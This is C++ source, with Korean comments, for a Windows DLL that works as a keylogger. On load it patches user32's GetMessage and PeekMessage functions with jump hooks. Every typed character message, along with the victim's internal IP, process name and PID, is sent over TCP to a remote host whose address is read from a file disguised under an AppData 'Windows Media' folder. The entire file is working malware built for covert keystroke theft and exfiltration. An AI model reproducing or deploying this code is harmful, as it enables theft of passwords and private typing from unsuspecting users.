// dllmain.cpp : DLL 애플리케이션의 진입점을 정의합니다.

#include "pch.h"
#include <fstream>

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>

#include <cstdlib>
#include <tlhelp32.h>

#include "mydef.h"
#include "UsableAPI.h"

#pragma comment(lib, "ws2_32.lib")

UCHAR GetMessageA_old[1 + sizeof(ARCH_UINT)] = "";
UCHAR GetMessageA_hook_instruction[1 + sizeof(ARCH_UINT)] = "\xe9";

UCHAR GetMessageW_old[1 + sizeof(ARCH_UINT)] = "";
UCHAR GetMessageW_hook_instruction[1 + sizeof(ARCH_UINT)] = "\xe9";

UCHAR PeekMessageA_old[1 + sizeof(ARCH_UINT)] = "";
UCHAR PeekMessageA_hook_instruction[1 + sizeof(ARCH_UINT)] = "\xe9";

UCHAR PeekMessageW_old[1 + sizeof(ARCH_UINT)] = "";
UCHAR PeekMessageW_hook_instruction[1 + sizeof(ARCH_UINT)] = "\xe9";

BOOL first_connected = TRUE;
BOOL GetMessage_first_hooked = TRUE;;
BOOL PeekMessage_first_hooked = TRUE;

SOCKET conn = 0;

SOCKET newConn(char* IP, int port);
SOCKET sendMSG(SOCKET sock, LPMSG msg);

BOOL WINAPI GetMessageA_hook(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
BOOL WINAPI GetMessageW_hook(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax); 
BOOL WINAPI PeekMessageA_hook(LPMSG lpMsg, HWND  hWnd, UINT  wMsgFilterMin, UINT  wMsgFilterMax, UINT  wRemoveMsg);
BOOL WINAPI PeekMessageW_hook(LPMSG lpMsg, HWND  hWnd, UINT  wMsgFilterMin, UINT  wMsgFilterMax, UINT  wRemoveMsg);

void hook(FARPROC addr, void* hook_addr, UCHAR* instruction, UCHAR* old);

char host_IP[20] = "";
int host_port = 0;
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
	{
		UCHAR jmp_hook[] = "\xe9\x00\x00\x00\x00\x00\x00\x00\x00";

		HMODULE hUser32 = GetModuleHandleA("user32.dll");
		if (!hUser32) // user32.dll 없음
			return TRUE;

		FARPROC GetMessageA_addr = GetProcAddress(hUser32, "GetMessageA");
		FARPROC GetMessageW_addr = GetProcAddress(hUser32, "GetMessageW");
		FARPROC PeekMessageA_addr = GetProcAddress(hUser32, "PeekMessageA");
		FARPROC PeekMessageW_addr = GetProcAddress(hUser32, "PeekMessageW");;

		if (!(GetMessageA_addr && GetMessageW_addr))
			return TRUE;
		
		// 후킹
		hook(GetMessageA_addr, GetMessageA_hook, GetMessageA_hook_instruction, GetMessageA_old);
		hook(GetMessageW_addr, GetMessageW_hook, GetMessageW_hook_instruction, GetMessageW_old);
		hook(PeekMessageA_addr, PeekMessageA_hook, PeekMessageA_hook_instruction, PeekMessageA_old);
		hook(PeekMessageW_addr, PeekMessageW_hook, PeekMessageW_hook_instruction, PeekMessageW_old);

		char* appdata;
		char dir[150] = "";

		_dupenv_s(&appdata, NULL, "appdata");
		strcpy_s(dir, appdata);
		strcat_s(dir, "\\Windows Media\\ini");

		std::fstream st(dir);
		st.getline(host_IP, sizeof(host_IP));
		host_port = 12344;
		break;
	}
    case DLL_THREAD_ATTACH:
		break;

    case DLL_THREAD_DETACH:
		break;

    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
void hook(FARPROC api, void* hook_addr, UCHAR* instruction, UCHAR* old)
{
	DWORD dwOld;
	UINT instruction_size = 1 + sizeof(ARCH_UINT);
	VirtualProtect((LPVOID)((ARCH_UINT)api),
		instruction_size + 2, PAGE_EXECUTE_READWRITE, &dwOld); // 실행코드 영역에 권한 부여
	memcpy(old, (LPVOID)api, instruction_size); // 후킹 전 원래 바이트 저장
	((ARCH_UINT*)(instruction + 1))[0] = (ARCH_UINT)hook_addr - (ARCH_UINT)api - 5; // jmp hook instruction 설정 후
	memcpy((LPVOID)api, instruction, instruction_size); // 훅 설치
}
SOCKET newConn(char* IP, int port)
{

	WSADATA wsa;
	SOCKET sock;
	struct sockaddr_in server;
	char dbg_error[100] = "";

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		sprintf_s(dbg_error, "initializing failed. error code : %d", WSAGetLastError());
		OutputDebugStringA(dbg_error);
		return 0;
	}

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		sprintf_s(dbg_error, "creating socket failed. error code : %d", WSAGetLastError());
		OutputDebugStringA(dbg_error);
		WSACleanup();
		return 0;
	}

	server.sin_addr.s_addr = inet_addr(IP);
	server.sin_family = AF_INET;
	server.sin_port = htons(port);

	ULONG arg = 1;
	ioctlsocket(sock, FIONBIO, &arg);

	if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0)
	{
		fd_set set;
		int err, len;
		timeval tvout = { 2, 0 };
		select(sock + 1, NULL, &set, NULL, &tvout);
		getsockopt(sock, SOL_SOCKET, SO_ERROR, (char*)&err, &len);
	}

	return sock;
}
SOCKET sendMSG(SOCKET sock, LPMSG msg)
{
	if (sock == 0) // 연결 안됬으면
	{
		sock = newConn(host_IP, host_port); // 새로운 연결 생성
		first_connected = TRUE;
	}

	char buff[300] = "";


	if (sock != 0) // 그래도 연결 안됬으면 건너뛰기
	{
		/* MSG객체 + 내부망 IP + 프로세스 이름(unicode) + pid + 아키텍쳐 정보로 전송할 데이터 구성 */

		DWORD dwPID = 0;
		memcpy(buff, msg, sizeof(MSG)); // MSG객체 쓰기

		int len = sizeof(MSG);
		if (first_connected)
		{
			
			// 내부망 IP쓰기
			char hostname[50];
			gethostname(hostname, 50);
			WCHAR* pWC = ConvertCtoWC(inet_ntoa(*(struct in_addr*)gethostbyname(hostname)->h_addr_list[0]));
			wcscpy((WCHAR*)(buff + len), pWC);
			len += sizeof(WCHAR) * (wcslen(pWC) + 1);
			delete pWC;

			// 프로세스 이름 쓰기
			GetWindowThreadProcessId(msg->hwnd, &dwPID);
			FindProcessName(dwPID, (WCHAR*)(buff + len));
			((WCHAR*)(buff + sizeof(MSG)))[len] = 0;
			len += sizeof(WCHAR) * (wcslen((WCHAR*)(buff + len)) + 1);

			// pid 쓰기
			memcpy(buff + len, &dwPID, 4);
			len += 4;

			// 아키텍쳐 정보 쓰기
#ifdef _WIN64
			buff[len] = 0x64;
#else
			buff[len] = 0x32;
#endif
			len++;

			first_connected = FALSE;
		}
		if (send(sock, buff, len, 0) == -1) // 연결이 끊어지면 서버가 다운된 것이므로
		{
			closesocket(sock);
			return 0; // 연결 안됨으로 설정
		}

	}
	return sock;
}
BOOL WINAPI GetMessageA_hook(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax)
{
	HMODULE hUser32 = GetModuleHandleA("user32.dll");
	FARPROC GetMessageA_addr = GetProcAddress(hUser32, "GetMessageA");

	if (GetMessage_first_hooked)
	{
		FARPROC PeekMessageA_addr = GetProcAddress(hUser32, "PeekMessageA");
		memcpy((LPVOID)PeekMessageA_addr, PeekMessageA_old, 1 + sizeof(ARCH_UINT));
		GetMessage_first_hooked = FALSE;
	}
	
	memcpy((LPVOID)GetMessageA_addr, GetMessageA_old, 1 + sizeof(ARCH_UINT)); // api 훅 제거 후
	BOOL ret = ((BOOL(WINAPI*) (LPMSG, HWND, UINT, UINT))GetMessageA_addr)
		(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax); // 호출
	memcpy((LPVOID)GetMessageA_addr, GetMessageA_hook_instruction, 1 + sizeof(ARCH_UINT)); // 훅 복원
	
	if (ret != -1)
	{
		char dbgmsg[100] = "";
		sprintf(dbgmsg, "message : 0x%lX wParam : 0x%X\n", lpMsg->message, lpMsg->wParam);
		OutputDebugStringA(dbgmsg);
		switch (lpMsg->message)
		{
		case WM_CHAR:
			conn = sendMSG(conn, lpMsg);

			break;

		}
	}
	return ret;
}
BOOL WINAPI GetMessageW_hook(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax)
{
	HMODULE hUser32 = GetModuleHandleA("user32.dll");
	FARPROC GetMessageW_addr = GetProcAddress(hUser32, "GetMessageW");
	if (GetMessage_first_hooked)
	{
		FARPROC PeekMessageW_addr = GetProcAddress(hUser32, "PeekMessageW");
		memcpy((LPVOID)PeekMessageW_addr, PeekMessageW_old, 1 + sizeof(ARCH_UINT));
		GetMessage_first_hooked = FALSE;
	}

	memcpy((LPVOID)GetMessageW_addr, GetMessageW_old, 1 + sizeof(ARCH_UINT)); // api 훅 제거 후
	BOOL ret = ((BOOL(WINAPI*) (LPMSG, HWND, UINT, UINT))GetMessageW_addr)
		(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax); // 호출
	memcpy((LPVOID)GetMessageW_addr, GetMessageW_hook_instruction, 1 + sizeof(ARCH_UINT)); // 훅 복원

	if (ret != -1)
	{
		char dbgmsg[100] = "";
		sprintf(dbgmsg, "message : 0x%X wParam : 0x%X\n", lpMsg->message, lpMsg->wParam);
		OutputDebugStringA(dbgmsg);
		switch (lpMsg->message)
		{
		case WM_CHAR:
			conn = sendMSG(conn, lpMsg);

			break;

		}
	}
	return ret;
}
BOOL WINAPI PeekMessageA_hook(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg)
{
	HMODULE hUser32 = GetModuleHandleA("user32.dll");
	FARPROC PeekMessageA_addr = GetProcAddress(hUser32, "PeekMessageA");

	memcpy((LPVOID)PeekMessageA_addr, PeekMessageA_old, 1 + sizeof(ARCH_UINT)); // api 훅 제거 후
	BOOL ret = ((BOOL(WINAPI*) (LPMSG, HWND, UINT, UINT, UINT))PeekMessageA_addr)
		(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg); // 호출
	memcpy((LPVOID)PeekMessageA_addr, PeekMessageA_hook_instruction, 1 + sizeof(ARCH_UINT)); // 훅 복원

	if (ret != -1)
	{
		char dbgmsg[100] = "";
		sprintf(dbgmsg, "message : 0x%X wParam : 0x%X\n", lpMsg->message, lpMsg->wParam);
		OutputDebugStringA(dbgmsg);
		switch (lpMsg->message)
		{
		case WM_CHAR:
			conn = sendMSG(conn, lpMsg);

			break;

		}
	}
	return ret;
}
BOOL WINAPI PeekMessageW_hook(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg)
{
	HMODULE hUser32 = GetModuleHandleA("user32.dll");
	FARPROC PeekMessageW_addr = GetProcAddress(hUser32, "PeekMessageW");

	memcpy((LPVOID)PeekMessageW_addr, PeekMessageW_old, 1 + sizeof(ARCH_UINT)); // api 훅 제거 후
	BOOL ret = ((BOOL(WINAPI*) (LPMSG, HWND, UINT, UINT, UINT))PeekMessageW_addr)
		(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg); // 호출
	memcpy((LPVOID)PeekMessageW_addr, PeekMessageW_hook_instruction, 1 + sizeof(ARCH_UINT)); // 훅 복원

	if (ret != -1)
	{
		char dbgmsg[100] = "";
		sprintf(dbgmsg, "message : 0x%X wParam : 0x%X\n", lpMsg->message, lpMsg->wParam);
		OutputDebugStringA(dbgmsg);
		switch (lpMsg->message)
		{
		case WM_CHAR:
			conn = sendMSG(conn, lpMsg);

			break;

		}
	}
	return ret;
}